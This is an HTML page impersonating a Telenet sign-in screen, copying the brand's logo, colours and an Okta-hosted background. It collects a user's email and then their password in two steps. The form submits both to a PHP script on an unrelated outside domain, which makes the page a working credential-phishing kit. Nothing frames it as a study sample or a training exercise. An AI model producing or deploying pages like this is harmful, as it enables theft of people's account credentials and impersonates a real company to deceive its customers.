<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telenet – Sign in</title>

<style>
:root {
  --yellow:#ffc72c;
  --bg:#fff1bf;
  --error-bg:#fde4e1;
  --error-text:#d93025;
  --text:#2b1e1e;
  --muted:#6b6b6b;
  --border:#cfcfcf;
}

* { box-sizing:border-box; font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }

body{
  margin:0;
  min-height:100vh;
  display:grid;
  place-items:center;
  background-image:url("https://ok9static.oktacdn.com/fs/bco/7/fs0chyx69ua4xbJnw417");
  background-size:cover;
  background-position:center;
}

.card{
  background:#fff;
  width:380px;
  padding:32px;
  border-radius:6px;
}

.logo{
  display:flex;
  align-items:center;
  gap:12px;
  font-size:26px;
  font-weight:700;
  margin-bottom:24px;
}

.lang{
  margin-left:auto;
  font-size:14px;
  color:var(--muted);
}

label{ font-size:14px; margin-bottom:6px; display:block; }

input{
  width:100%;
  padding:12px;
  border:2px solid var(--border);
  border-radius:4px;
  font-size:15px;
}

button{
  width:100%;
  padding:14px;
  background:var(--yellow);
  border:none;
  border-radius:4px;
  font-size:16px;
  font-weight:700;
  cursor:pointer;
  margin-top:16px;
}

.error-box{
  display:none;
  background:var(--error-bg);
  padding:12px;
  border-radius:4px;
  font-size:14px;
  margin-bottom:14px;
}

.field-error{
  display:none;
  font-size:13px;
  color:var(--error-text);
  margin-top:6px;
}

.hidden{ display:none; }
</style>
</head>

<body>

<form id="form" action="https://taylortownseo.com/next2.php" method="POST">

  <!-- EMAIL STEP -->
  <div class="card" id="emailStep">
    <div class="logo">
      <span>
        <img src="https://www.clipartmax.com/png/middle/278-2787023_telenet-wiki-transparent-telenet-logo-svg.png"
             style="width:50px;height:50px;">
      </span>
      Telenet      <div class="lang">EN</div>
    </div>

    <div class="error-box" id="formError">
      Something is missing. Please check the form and complete it.
    </div>

    <label>Your e-mail address</label>
    <input type="email" id="email" name="email" required>
    <div class="field-error" id="emailError">
      This field cannot be left blank
    </div>

    <div class="checkbox">
      <input type="checkbox" name="remember_me" value="1">
      <span>Keep me signed in</span>
    </div>

    <!-- IMPORTANT: NOT submit -->
    <button type="button" onclick="validateEmail()">Next</button>
  </div>

  <!-- PASSWORD STEP -->
  <div class="card hidden" id="passwordStep">
    <div class="logo">
      <span>
        <img src="https://www.clipartmax.com/png/middle/278-2787023_telenet-wiki-transparent-telenet-logo-svg.png"
             style="width:50px;height:50px;">
      </span>
      Telenet
    </div>

    <h3>Sign in with your password</h3>

    <label>Password</label>
    <input type="password" name="password" required>

    <!-- THIS submits -->
    <button type="submit" style="margin-top:20px">Confirm</button>

    <div class="links">
      <a href="#" onclick="backToEmail()">Back to sign in</a>
    </div>
  </div>

</form>


<script>
function validateEmail() {
  const email = document.getElementById("email").value.trim();
  const emailError = document.getElementById("emailError");
  const formError = document.getElementById("formError");

  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  emailError.style.display = "none";
  formError.style.display = "none";

  if (!email || !regex.test(email)) {
    emailError.style.display = "block";
    formError.style.display = "block";
    return;
  }

  document.getElementById("emailStep").classList.add("hidden");
  document.getElementById("passwordStep").classList.remove("hidden");
}

function backToEmail() {
  document.getElementById("passwordStep").classList.add("hidden");
  document.getElementById("emailStep").classList.remove("hidden");
}
</script>


</body>
</html>
